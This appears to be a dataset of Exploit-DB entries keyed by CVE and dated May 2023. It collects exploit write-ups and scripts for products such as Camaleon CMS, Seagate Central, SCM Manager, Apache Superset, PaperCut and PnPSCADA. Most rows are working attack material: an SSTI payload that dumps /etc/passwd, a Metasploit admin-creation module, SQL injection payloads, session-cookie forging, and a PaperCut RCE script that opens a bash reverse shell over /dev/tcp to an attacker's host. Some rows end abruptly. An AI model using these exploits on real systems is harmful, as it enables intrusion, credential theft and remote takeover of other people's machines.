""remote-download"" job to trigger an HTTP request: $ export JWT="" "" $ echo '{""urls"": ["" <URL> ""target"": ""personal-files""}' \ | jq '{""JobName"": ""remote-download"", ""JsonParameters"": (. | tostring)}' \ | tee remote-download.json $ curl --header ""Authorization: Bearer $JWT"" \ --header 'Content-Type: application/json' \ --request PUT \ --data -download.json ' <URL> The URL in the JSON document specifies which URL to request. The ""target"" field in the same document specifies into which folder the response is saved. Afterwards, the response is contained in a file in the specified folder. Potential errors are communicated through the WebSocket channel. Workaround Limit the services which can be reached by the Pydio Cells server, for example using an outbound firewall. Fix Upgrade Pydio Cells to a version without the vulnerability. Security Risk The risk is highly dependent on the environment in which the attacked Pydio Cells instance runs. If there are any internal HTTP services which expose sensitive data on the same machine or within the same network, the server-side request forgery vulnerability could pose a significant risk. In other circumstances, the risk could be negligible. Therefore, overall the vulnerability is rated as a medium risk. Timeline 2023-03-23 Vulnerability identified 2023-05-02 Customer approved disclosure to vendor 2023-05-02 Vendor notified 2023-05-03 CVE ID requested 2023-05-08 Vendor released fixed version 2023-05-14 CVE ID assigned 2023-05-16 Vendor asks for a few more days before the advisory is released 2023-05-30 Advisory released References RedTeam Pentesting GmbH RedTeam Pentesting offers individual penetration tests performed by a team of specialised IT-security experts. Hereby, security weaknesses in company networks or products are uncovered and can be fixed immediately. As there are only few experts in this field, RedTeam Pentesting wants to share its knowledge and enhance the public knowledge with research in security-related areas. The results are made available as public security advisories. More information about RedTeam Pentesting can be found at: <URL> Working at RedTeam Pentesting RedTeam Pentesting is looking for penetration testers to join our team in Aachen, Germany. If you are interested please visit: <URL>"
CVE-2023-30145,"{""CVE-2023-30145"": 1}",2023-05-26,Camaleon CMS v2.7.0 - Server-Side Template Injection (SSTI),https://www.exploit-db.com/exploits/51489,"Exploit Title: Camaleon CMS v2.7.0 - Server-Side Template Injection (SSTI) Exploit Author: PARAG BAGUL CVE: CVE-2023-30145 #Description Camaleon CMS v2.7.0 was discovered to contain a Server-Side Template Injection (SSTI) vulnerability via the formats parameter. #Affected Component All versions below 2.7.0 are affected. #Author Parag Bagul #Steps to Reproduce 1. Open the target URL: <URL> 2. Upload any file and intercept the request. 3. In the formats parameter value, add the payload test<%= 7*7 %>test. 4. Check the response. It should return the multiplication of 77 with the message ""File format not allowed (dqopi49vuuvm)"". #Detection: Request: POST /admin/media/upload?actions=false HTTP/1.1 Host: target.com User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: / Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: <URL> X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=-327175120238370517612522354688 Content-Length: 1200 Origin: <URL> DNT: 1 Connection: close Cookie: cookie -327175120238370517612522354688 Content-Disposition: form-data; name=""fileupload""; filename=""test.txt"" Content-Type: text/plain test -327175120238370517612522354688 Content-Disposition: form-data; name=""versions"" -327175120238370517612522354688 Content-Disposition: form-data; name=""thumbsize"" -327175120238370517612522354688 Content-Disposition: form-data; name=""formats"" test<%= 7*7 %>test -327175120238370517612522354688 Content-Disposition: form-data; name=""mediaformats"" image -327175120238370517612522354688 Content-Disposition: form-data; name=""dimension"" -327175120238370517612522354688 Content-Disposition: form-data; name=""private"" -327175120238370517612522354688 Content-Disposition: form-data; name=""folder"" -327175120238370517612522354688 Content-Disposition: form-data; name=""skipautocrop"" true -327175120238370517612522354688-- Response: HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8 Connection: close Status: 200 OK Cache-Control: max-age=0, private, must-revalidate Set-Cookie: cookie Content-Length: 41 File format not allowed (test49test) Exploitation: To execute a command, add the following payload: testqopi<%= File.open('/etc/passwd').read %>fdtest Request: POST /admin/media/upload?actions=true HTTP/1.1 Host: target.com User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: / Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: <URL> X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=-104219633614133026962934729021 Content-Length: 1237 Origin: <URL> DNT: 1 Connection: close Cookie: cookie -104219633614133026962934729021 Content-Disposition: form-data; name=""fileupload""; filename=""test.txt"" Content-Type: text/plain test -104219633614133026962934729021 Content-Disposition: form-data; name=""versions"" -104219633614133026962934729021 Content-Disposition: form-data; name=""thumbsize"" -104219633614133026962934729021 Content-Disposition: form-data; name=""formats"" dqopi<%= File.open('/etc/passwd').read %>fdfdsf -104219633614133026962934729021 Content-Disposition: form-data; name=""mediaformats"" -104219633614133026962934729021 Content-Disposition: form-data; name=""dimension"" -104219633614133026962934729021 Content-Disposition: form-data; name=""private"" -104219633614133026962934729021 Content-Disposition: form-data; name=""folder"" -104219633614133026962934729021 Content-Disposition: form-data; name=""skipautocrop"" true -104219633614133026962934729021-- Response: Response: HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8 Connection: close Status: 200 OK Set-Cookie: cookie Content-Length: 1816 File format not allowed (dqopiroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin fdfdsf)"
CVE-2023-31747,"{""CVE-2023-31747"": 1}",2023-05-25,Filmora 12 version ( Build 1.0.0.7) - Unquoted Service Paths Privilege Escalation,https://www.exploit-db.com/exploits/51483,"Exploit Title: Filmora 12 version ( Build 1.0.0.7) - Unquoted Service Paths Privilege Escalation Date: 20 May 2023 Exploit Author: Thurein Soe Vendor Homepage: <URL> Software Link: <URL> Version: Filmora 12 ( Build 1.0.0.7) Tested on: Windows 10 (Version 10.0.19045.2965) CVE : CVE-2023-31747 Vulnerability description: Filmora is a professional video editing software. Wondershare NativePush Build 1.0.0.7 was part of Filmora 12 (Build 12.2.1.2088). Wondershare NativePush Build 1.0.0.7 was installed while Filmora 12 was installed. The service name ""NativePushService"" was vulnerable to unquoted service paths vulnerability which led to full local privilege escalation in the affected window operating system as the service ""NativePushService"" was running with system privilege that the local user has write access to the directory where the service is located. Effectively, the local user is able to elevate to local admin upon successfully replacing the affected executable. C:\sc qc NativePushService [SC] QueryServiceConfig SUCCESS SERVICENAME: NativePushService TYPE : 10 WIN32OWNPROCESS STARTTYPE : 2 AUTOSTART ERRORCONTROL : 1 NORMAL BINARYPATHNAME : C:\Users\HninKayThayar\AppData\Local\Wondershare\Wondershare NativePush\WsNativePushService.exe LOADORDERGROUP : TAG : 0 DISPLAYNAME : Wondershare Native Push Service DEPENDENCIES : SERVICESTART_NAME : LocalSystem C:\cacls ""C:\Users\HninKayThayar\AppData\Local\Wondershare\Wondershare NativePush\WsNativePushService.exe"" C:\Users\HninKayThayar\AppData\Local\Wondershare\Wondershare NativePush\WsNativePushService.exe BUILTIN\Users:(ID)F NT AUTHORITY\SYSTEM:(ID)F BUILTIN\Administrators:(ID)F HNINKAYTHAYAR\HninKayThayar:(ID)F"
CVE-2020-6627,"{""CVE-2020-6627"": 1}",2023-05-25,Seagate Central Storage 2015.0916 - Unauthenticated Remote Command Execution (Metasploit),https://www.exploit-db.com/exploits/51487,"Exploit Title: Seagate Central Storage 2015.0916 - Unauthenticated Remote Command Execution (Metasploit) Date: Dec 9 2019 Exploit Author: Ege Balci Vendor Homepage: <URL> Version: 2015.0916 CVE : 2020-6627 This module requires Metasploit: <URL> Current source: <URL> require 'net/http' require 'net/ssh' require 'net/ssh/commandstream' class MetasploitModule < Msf::Exploit::Remote Rank = ExcellentRanking include Msf::Exploit::Remote::HttpClient include Msf::Exploit::Remote::SSH def initialize(info={}) super(updateinfo(info, 'Name' => ""Seagate Central External NAS Arbitrary User Creation"", 'Description' => %q{ This module exploits the broken access control vulnerability in Seagate Central External NAS Storage device. Subject product suffers several critical vulnerabilities such as broken access control. It makes it possible to change the device state and register a new admin user which is capable of SSH access. 'License' => MSFLICENSE, 'Author' => 'Ege Balcı ' author & msf module 'References' => ['URL', ' <URL> ['CVE', '2020-6627'] 'DefaultOptions' => 'SSL' => false, 'WfsDelay' => 5, 'Platform' => ['unix'], 'Arch' => [ARCHCMD], 'Payload' => 'Compat' => { 'PayloadType' => 'cmdinteract', 'ConnectionType' => 'find' 'Targets' => ['Auto', 'Platform' => 'unix', 'Arch' => ARCHCMD 'Privileged' => true, 'DisclosureDate' => ""Dec 9 2019"", 'DefaultTarget' => 0 registeroptions( OptString.new('USER', [ true, 'Seagate Central SSH user', '']), OptString.new('PASS', [ true, 'Seagate Central SSH user password', '']) ], self.class registeradvancedoptions( OptBool.new('SSHDEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]), OptInt.new('SSHTIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30]) end def check res = sendrequestcgi({ 'method' => 'GET', 'uri' => normalizeuri(targeturi.path,""/index.php/Start/getfirmware""), 'headers' => { 'X-Requested-With' => 'XMLHttpRequest' },60) if res && res.body.include?('Cirrus NAS') && res.body.include?('2015.0916') Exploit::CheckCode::Appears else Exploit::CheckCode::Safe end end def exploit First get current state firststate=getstate() if firststate printstatus(""Current device state: #{firststate['state']}"") else return end if firststate['state'] != 'start' Set new start state firststate['state'] = 'start' res = sendrequestcgi({ 'method' => 'POST', 'uri' => normalizeuri(targeturi.path,'/index.php/Start/setstartinfo'), 'ctype' => 'application/x-www-form-urlencoded', 'data' => ""info=#{firststate.tojson}"" },60) changedstate=getstate() if changedstate && changedstate['state'] == 'start' printgood(""State successfully changed !"") else printerror(""Could not change device state"") return end end name = Rex::Text.randnamemale user = datastore['USER'] || ""#{Rex::Text.randnamemale}{rand(1..9999).tos}"" pass = datastore['PASS'] || Rex::Text.randtextalpha(8) printstatus('Creating new admin user.') printstatus(""User: #{user}"") printstatus(""Pass: #{pass}"") Add new admin user res = sendrequestcgi({ 'method' => 'POST', 'uri' => normalizeuri(targeturi.path,""/index.php/Start/addedituser""), 'ctype' => 'application/x-www-form-urlencoded', 'headers' => { 'X-Requested-With' => 'XMLHttpRequest' 'varspost' => {user: JSON.dump({user: user, fullname: name, pwd: pass, email: ""#{name}"", isAdmin: true, uid: -1}), action: 1} },60) conn = dologin(user,pass) if conn printgood(""#{rhost}:#{rport} - Login Successful (#{user}:#{pass})"") handler(conn.lsock) end end def dologin(user, pass) factory = sshsocketfactory opts = { :authmethods => ['password', 'keyboard-interactive'], :port => 22, :useagent => false, :config => false, :password => pass, :proxy => factory, :noninteractive => true, :verifyhostkey => :never opts.merge!(:verbose => :debug) if datastore['SSHDEBUG'] begin ssh = nil ::Timeout.timeout(datastore['SSHTIMEOUT']) do ssh = Net::SSH.start(rhost, user, opts) end rescue Rex::ConnectionError failwith Failure::Unreachable, 'Connection failed' rescue Net::SSH::Disconnect, ::EOFError printerror ""#{rhost}:#{rport} SSH - Disconnected during negotiation"" return rescue ::Timeout::Error printerror ""#{rhost}:#{rport} SSH - Timed out during negotiation"" return rescue Net::SSH::AuthenticationFailed printerror ""#{rhost}:#{rport} SSH - Failed authentication"" rescue Net::SSH::Exception => e printerror ""#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"" return end if ssh conn = Net::SSH::CommandStream.new(ssh) ssh = nil return conn end return nil end def getstate res = sendrequestcgi({ 'method' => 'GET', 'uri' => normalizeuri(targeturi.path,""/index.php/Start/jsongetstartinfo""), 'headers' => { 'X-Requested-With' => 'XMLHttpRequest' },60) if res && (res.code == 200 ||res.code == 100) return res.getjson_document end res = nil end end"
CVE-2023-33829,"{""CVE-2023-33829"": 1}",2023-05-25,SCM Manager 1.60 - Cross-Site Scripting Stored (Authenticated),https://www.exploit-db.com/exploits/51488,"#!/usr/bin/python3 Exploit Title: SCM Manager 1.60 - Cross-Site Scripting Stored (Authenticated) Google Dork: intitle:""SCM Manager"" intext:1.60 Date: 05-25-2023 Exploit Author: neg0x ( <URL> Vendor Homepage: <URL> Software Link: <URL> Version: 1.2 <= 1.60 Tested on: Debian based CVE: CVE-2023-33829 Modules import requests import argparse import sys Main menu parser = argparse.ArgumentParser(description='CVE-2023-33829 exploit') parser.addargument(""-u"", ""--user"", help=""Admin user or user with write permissions"") parser.addargument(""-p"", ""--password"", help=""password of the user"") args = parser.parseargs() Credentials user = sys.argv[2] password = sys.argv[4] Global Variables mainurl = "" <URL> Change URL if its necessary authurl = mainurl + ""/api/rest/authentication/login.json"" users = mainurl + ""/api/rest/users.json"" groups = mainurl + ""/api/rest/groups.json"" repos = mainurl + ""/api/rest/repositories.json"" Create a session session = requests.Session() Credentials to send postdata={ 'username': user, change if you have any other user with write permissions 'password': password change if you have any other user with write permissions r = session.post(authurl, data=postdata) if r.statuscode == 200: print(""[+] Authentication successfully"") else: print(""[-] Failed to authenticate"") sys.exit(1) newuser={ ""name"": ""newUser"", ""displayName"": "" "", ""mail"": """", ""password"": """", ""admin"": False, ""active"": True, ""type"": ""xml"" createuser = session.post(users, json=newuser) print(""[+] User with XSS Payload created"") newgroup={ ""name"": ""newGroup"", ""description"": "" "", ""type"": ""xml"" creategroup = session.post(groups, json=newgroup) print(""[+] Group with XSS Payload created"") newrepo={ ""name"": ""newRepo"", ""type"": ""svn"", ""contact"": """", ""description"": "" "", ""public"": False createrepo = session.post(repos, json=newrepo) print(""[+] Repository with XSS Payload created"")"
CVE-2023-34581,"{""CVE-2023-34581"": 1}",2023-05-24,Service Provider Management System v1.0 - SQL Injection,https://www.exploit-db.com/exploits/51482,"Exploit Title: Service Provider Management System v1.0 - SQL Injection Date: 2023-05-23 Exploit Author: Ashik Kunjumon Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: Windows/Linux 1. Description: Service Provider Management System v1.0 allows SQL Injection via ID parameter in /php-spms/?page=services/view&id=2 Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database. Endpoint: /php-spms/?page=services/view&id=2 Vulnerable parameter: id (GET) 2. Proof of Concept: Step 1 - By visiting the url: <URL> just add single quote to verify the SQL Injection. Step 2 - Run sqlmap -u "" <URL> -p id --dbms=mysql SQLMap Response: Parameter: id (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: page=services/view&id=1' AND 8462=8462 AND 'jgHw'='jgHw Type: error-based Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: page=services/view&id=1' AND (SELECT 1839 FROM(SELECT COUNT(),CONCAT(0x7178717171,(SELECT (ELT(1839=1839,1),0x7176786271,FLOOR(RAND(0)2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'Cqhk'='Cqhk Type: time-based blind Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP) Payload: page=services/view&id=1' AND (SELECT 1072 FROM (SELECT(SLEEP(5)lurz) AND 'RQzT'='RQzT"
CVE-2023-31873,"{""CVE-2023-31873"": 1}",2023-05-23,Gin Markdown Editor v0.7.4 (Electron) - Arbitrary Code Execution,https://www.exploit-db.com/exploits/51469,Exploit Title: Gin Markdown Editor v0.7.4 (Electron) - Arbitrary Code Execution Date: 2023-04-24 Exploit Author: 8bitsec CVE: CVE-2023-31873 Vendor Homepage: <URL> Software Link: <URL> Version: 0.7.4 Tested on: [Mac OS 13] Release Date: 2023-04-24 Product & Service Introduction: Javascript Markdown editor for Mac Technical Details & Description: A vulnerability was discovered on Gin markdown editor v0.7.4 allowing a user to execute arbitrary code by opening a specially crafted file. Proof of Concept (
CVE-2023-31874,"{""CVE-2023-31874"": 1}",2023-05-23,Yank Note v3.52.1 (Electron) - Arbitrary Code Execution,https://www.exploit-db.com/exploits/51470,"Exploit Title: Yank Note v3.52.1 (Electron) - Arbitrary Code Execution Date: 2023-04-27 Exploit Author: 8bitsec CVE: CVE-2023-31874 Vendor Homepage: yank-note.com Software Link: <URL> Version: 3.52.1 Tested on: [Ubuntu 22.04 | Mac OS 13] Release Date: 2023-04-27 Product & Service Introduction: A Hackable Markdown Editor for Programmers. Version control, AI completion, mind map, documents encryption, code snippet running, integrated terminal, chart embedding, HTML applets, Reveal.js, plug-in, and macro replacement Technical Details & Description: A vulnerability was discovered on Yank Note v3.52.1 allowing a user to execute arbitrary code by opening a specially crafted file. Proof of Concept ("
CVE-2023-31748,"{""CVE-2023-31748"": 1}",2023-05-23,MobileTrans  4.0.11 - Weak Service Privilege Escalation,https://www.exploit-db.com/exploits/51479,"Exploit Title :MobileTrans 4.0.11 - Weak Service Privilege Escalation Date: 20 May 2023 Exploit Author: Thurein Soe Vendor Homepage: <URL> Software Link: <URL> Version: MobileTrans version 4.0.11 Tested on: Window 10 (Version 10.0.19045.2965) CVE : CVE-2023-31748 Vulnerability Description: MobileTrans is World 1 mobile-to-mobile file transfer application.MobileTrans version 4.0.11 was being suffered a weak service permission vulnerability that allows a normal window user to elevate to local admin. The ""ElevationService"" service name was installed, while the MobileTrans version 4.0.11 was installed in the window operating system. The service ""ElevationService"" allows the local user to elevate to the local admin as The ""ElevationService"" run with system privileges. Effectively, the local user is able to elevate to local admin upon successfully modifying the service or replacing the affected executable. C:\Users\HninKayThayar\Desktop>sc qc ElevationService [SC] QueryServiceConfig SUCCESS SERVICENAME: ElevationService TYPE : 10 WIN32OWNPROCESS STARTTYPE : 2 AUTOSTART ERRORCONTROL : 1 NORMAL BINARYPATHNAME : C:\Program Files (x86)\Wondershare\MobileTrans\ElevationService.exe LOADORDERGROUP : TAG : 0 DISPLAYNAME : Wondershare Driver Install Service help DEPENDENCIES : SERVICESTART_NAME : LocalSystem C:\Users\HninKayThayar\Desktop>cacls ""C:\Program Files (x86)\Wondershare\MobileTrans\ElevationService.exe"" C:\Program Files (x86)\Wondershare\MobileTrans\ElevationService.exe Everyone:(ID)F NT AUTHORITY\SYSTEM:(ID)F BUILTIN\Administrators:(ID)F BUILTIN\Users:(ID)R APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(ID)R APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(ID)R"
CVE-2023-27823,"{""CVE-2023-27823"": 1}",2023-05-23,Optoma 1080PSTX Firmware C02 - Authentication Bypass,https://www.exploit-db.com/exploits/51444,"Exploit Title: Optoma 1080PSTX Firmware C02 - Authentication Bypass Date: 2023/05/09 Exploit Author: Anthony Cole Contact: <URL> Website: <URL> Vendor Homepage: <URL> Version: Optoma 1080PSTX Firmware C02 Tested on: N/A CVE : CVE-2023-27823 Details By default the web interface of the 1080PSTX requires a username and password to access the application control panel. However, an attacker, on the same network, can bypass it by manually setting the ""atop"" cookie to the value of ""1"". GET /index.asp HTTP/1.1 Host: projector Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: atop=1 Connection: close"
CVE-2023-27524,"{""CVE-2023-27524"": 1}",2023-05-23,Apache Superset 2.0.0 - Authentication Bypass,https://www.exploit-db.com/exploits/51447,"Exploit Title: Apache Superset 2.0.0 - Authentication Bypass Date: 10 May 2023 Exploit Author: MaanVader Vendor Homepage: <URL> Version: Apache Superset<= 2.0.1 Tested on: 2.0.0 CVE: CVE-2023-27524 from flaskunsign import session import requests import urllib3 import argparse import re from time import sleep from selenium import webdriver from urllib.parse import urlparse urllib3.disablewarnings(urllib3.exceptions.InsecureRequestWarning) SECRETKEYS = [ b'\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h', version < 1.4.1 b'CHANGEMETOACOMPLEXRANDOMSECRET', version >= 1.4.1 b'thisISaSECRET1234', deployment template b'YOUROWNRANDOMGENERATEDSECRETKEY', documentation b'TESTNONDEVSECRET' docker compose def main(): parser = argparse.ArgumentParser() parser.addargument('--url', '-u', help='Base URL of Superset instance', required=True) parser.addargument('--id', help='User ID to forge session cookie for, default=1', required=False, default='1') args = parser.parseargs() try: u = args.url.rstrip('/') + '/login/' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0' resp = requests.get(u, headers=headers, verify=False, timeout=30, allowredirects=False) if resp.statuscode != 200: print(f'Error retrieving login page at {u}, status code: {resp.statuscode}') return sessioncookie = None for c in resp.cookies: if c.name == 'session': sessioncookie = c.value break if not sessioncookie: print('Error: No session cookie found') return print(f'Got session cookie: {sessioncookie}') try: decoded = session.decode(sessioncookie) print(f'Decoded session cookie: {decoded}') except: print('Error: Not a Flask session cookie') return match = re.search(r'""versionstring"": ""(.*?)""', resp.text) if match: version = match.group(1) else: version = 'Unknown' print(f'Superset Version: {version}') for i, k in enumerate(SECRETKEYS): cracked = session.verify(sessioncookie, k) if cracked: break if not cracked: print('Failed to crack session cookie') return print(f'Vulnerable to CVE-2023-27524 - Using default SECRETKEY: {k}') try: userid = int(args.id) except: userid = args.id forgedcookie = session.sign({'userid': userid, 'userid': userid}, k) print(f'Forged session cookie for user {userid}: {forgedcookie}') u1 = args.url.rstrip('/') + '/superset/welcome' print(f""Now visit the url: `{u1}` and replace the current session cookie with this `{forgedcookie}` and refresh the page and we will be logged in as admin to the dashboard:)"") except Exception as e: print(f'Unexpected error: {e}') if name == 'main': main()"
CVE-2023-1934,"{""CVE-2023-1934"": 1}",2023-05-23,PnPSCADA v2.x - Unauthenticated PostgreSQL Injection,https://www.exploit-db.com/exploits/51448,"Exploit Title: PnPSCADA v2.x - Unauthenticated PostgreSQL Injection Date: 15/5/2023 Exploit Author: Momen Eldawakhly (Cyber Guy) at Samurai Digital Security Ltd Vendor Homepage: <URL> Version: PnPSCADA (cross platforms): v2.x Tested on: Unix CVE : CVE-2023-1934 Proof-of-Concept: <URL> SQLi crashing point: GET /hitlogcsv.isp?userids=1337'&startdate= 2022-12-138200083A0093A00&enddate=2022-12-138201383A1783A00 HTTP/1.1 Cache-Control: no-cache User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14 Host: vulnerablepnpscada.int Accept: / Accept-Encoding: gzip, deflate Connection: close"
CVE-2023-27350,"{""CVE-2023-27350"": 1}",2023-05-23,PaperCut NG/MG 22.0.4 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/51452,"Exploit Title: PaperCut NG/MG 22.0.4 - Remote Code Execution (RCE) Date: 13 May 2023 Exploit Author: Mohin Paramasivam (Shad0wQu35t) and MaanVader Vendor Homepage: <URL> Version: 8.0 or later Tested on: 22.0.4 CVE: CVE-2023-27350 import requests import argparse Grouppayload = { ""service"":""direct/1/OptionsUserSync/$OptionsUserSource.$Form"", ""sp"":""S0"", ""Form0"":""$Hidden,$Hidden$0,$Hidden$1,$PropertySelection,$Hidden$2,$Hidden$3,$Hidden$4,$Hidden$5,$Hidden$6,$Hidden$7,$Hidden$8,$Hidden$9,$Hidden$10,$Hidden$11,$Hidden$12,$Hidden$13,$Hidden$14,$TextField,$TextField$0,$RadioGroup,$Submit,$Checkbox$2,primaryCardIdLength,$Checkbox$3,secondaryCardIdLength,$Checkbox$5,$Hidden$15,$Hidden$16,$Hidden$17,$Hidden$18,$Hidden$19,$Hidden$20,$Hidden$21,$PropertySelection$4,$TextField$13,$Checkbox$6,$TextField$14,$TextField$15,$TextField$16,$RadioGroup$0,$Submit$1,$PropertySelection$5,$TextField$17,$PropertySelection$6,$TextField$18,primaryCardId2Length,$PropertySelection$7,$TextField$19,secondaryCardId2Length,$Checkbox$7,$TextField$20,$Checkbox$8,$Checkbox$9,$Checkbox$10,$Submit$2,$Submit$3,$Submit$4,$Submit$5"", ""$Hidden"":""Sf278fd737ffcaed6eb3d1f67c2ba5c6d"", ""$Hidden$0"":""F"", ""$Hidden$1"":""F"", ""$Hidden$2"":""OH4sIAAAAAAAAAJWQwUrDQBCGp60VBBUp4lWRnncRPIjSg4iHwrYNpBU8xXW7JitJdp1sis2hF5BlxBP-lw-gF50Y2Mp6MW5DTPfP8z2QzBDotSqI4UaiyC0xIg1JJnGihCQDY5VOs5HrfZ2jkMOpkVeHny8bD8VeHVa6sBYYVBqVnTLYCnhuIw91iDzxuI0stNgtn3Aa8zSkvkWVhies1MTc3mhMLBwzR6cdFrSaUWnf9LbXqV1h3aCfDFbwt7BDGr3CO3fwXKrYsK04LEq5Pg8zZPex26j87i-XQdwkn2NIeGGi0gSoZPE4Ulpnki3mpFS8N556r4eXBR1qDFoqj5P5BxoLKyejfzhoAcAYzNDOPrnZxfZoKrWt6nN8odzG6WB5aFjNk77l-YLeZfbs8sBAAA."", ""$Hidden$3"":""F"", ""$Hidden$4"":""X"", ""$Hidden$5"":""X"", ""$Hidden$6"":""X"", ""$Hidden$7"":""X"", ""$Hidden$8"":""X"", ""$Hidden$9"":""X"", ""$Hidden$10"":""X"", ""$Hidden$11"":""X"", ""$Hidden$12"":""X"", ""$Hidden$13"":""F"", ""$Hidden$14"":""X"", ""$Hidden$15"":""F"", ""$Hidden$16"":""S"", ""$Hidden$17"":""S"", ""$Hidden$18"":""S"", ""$Hidden$19"":""S"", ""$Hidden$20"":""F"", ""$Hidden$21"":""SSTANDARDUNIX"", ""$PropertySelection"":""3,CUSTOM"", ""$TextField"":""/usr/bin/python3"", ""$TextField$0"":""/usr/bin/python3"", ""$RadioGroup"":""0"", ""primaryCardIdLength"":""8"", ""secondaryCardIdLength"":""8"", ""$PropertySelection$4"":""0,STANDARDUNIX"", ""$TextField$13"":"""", ""$TextField$14"":"""", ""$TextField$15"":"""", ""$TextField$16"":"""", ""$RadioGroup$0"":""0"", ""$PropertySelection$5"":""NONE"", ""$TextField$17"":"""", ""$PropertySelection$6"":""NONE"", ""$TextField$18"":""employeeNumber"", ""primaryCardId2Length"":""8"", ""$PropertySelection$7"":""NONE"", ""$TextField$19"":"""", ""secondaryCardId2Length"":""8"", ""$TextField$20"":"""", ""$Submit$4"":""Apply"" parser = argparse.ArgumentParser(description=""Papercut RCE"") parser.addargument('--url',help='Url of the vunerable application example <URL> dont need the trailing /') parser.addargument('--ip',help='our rev shell ip') parser.addargument('--port',help='our rev shell port') args = parser.parseargs() url = args.url ip = args.ip port = args.port passwdinput = f""import os;os.system(\""/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\"")"" finalpayload = { ""service"":""direct/1/Home/$Form$0"", ""sp"":""S0"", ""Form0"":""$Hidden$0,$Hidden$1,inputUsername,inputPassword,$PropertySelection$0,$Submit$0"", ""$Hidden$0"":""true"", ""$Hidden$1"":""X"", ""inputUsername"":""help"", ""inputPassword"":passwdinput, ""$PropertySelection$0"":""en"", ""$Submit$0"":""Log+in"" create a session session = requests.Session() visit the first URL to set up the session setupurl = url+""/app?service=page/SetupCompleted"" response = session.get(setupurl) response.raiseforstatus() check for any errors visit the second URL using the same session dashboardurl = url+""/app?service=page/Dashboard"" response = session.get(dashboardurl) response.raiseforstatus() check for any errors URL to change user group usergroupchangeurl = url+""/app"" response = session.post(usergroupchangeurl,data=Grouppayload) response.raiseforstatus() check for errors URL to gain RCE rceurl = url+""/app"" response = session.post(rceurl,data=finalpayload) response.raisefor_status() Check for any errors print the response text print(response.text)"
CVE-2023-30256,"{""CVE-2023-30256"": 1}",2023-05-23,Webkul Qloapps 1.5.2 - Cross-Site Scripting (XSS),https://www.exploit-db.com/exploits/51465,"Exploit Title: Webkul Qloapps 1.5.2 - Cross-Site Scripting (XSS) Date: 15 May 2023 Exploit Author: Astik Rawat (ahrixia) Vendor Homepage: <URL> Software Link: <URL> Version: 1.5.2 Tested on: Kali Linux 2022.4 CVE : CVE-2023-30256 Description: A Cross Site Scripting (XSS) vulnerability exists in Webkul Qloapps which is a free and open-source hotel reservation & online booking system written in PHP and distributed under OSL-3.0 Licence. Steps to exploit: 1) Go to Signin page on the system. 2) There are two parameters which can be exploited via XSS - back - email_create 2.1) Insert your payload in the ""back""- GET and POST Request Proof of concept ("
CVE-2023-31702,"{""CVE-2023-31702"": 1}",2023-05-23,eScan Management Console 14.0.1400.2281 - SQL Injection (Authenticated),https://www.exploit-db.com/exploits/51466,Exploit Title: eScan Management Console 14.0.1400.2281 - SQL Injection (Authenticated) Date: 16/05/2023 Exploit Author: Sahil Ojha Vendor Homepage: <URL> Software Link: <URL> Version: 14.0.1400.2281 Tested on: Windows CVE : CVE-2023-31702 *Step of Reproduction/Proof of concept(
CVE-2023-31703,"{""CVE-2023-31703"": 1}",2023-05-23,eScan Management Console 14.0.1400.2281 - Cross Site Scripting,https://www.exploit-db.com/exploits/51467,Exploit Title: eScan Management Console 14.0.1400.2281 - Cross Site Scripting Date: 2023-05-16 Exploit Author: Sahil Ojha Vendor Homepage: <URL> Software Link: <URL> Version: 14.0.1400.2281 Tested on: Windows CVE : CVE-2023-31703 *Step of Reproduction/ Proof of Concept(
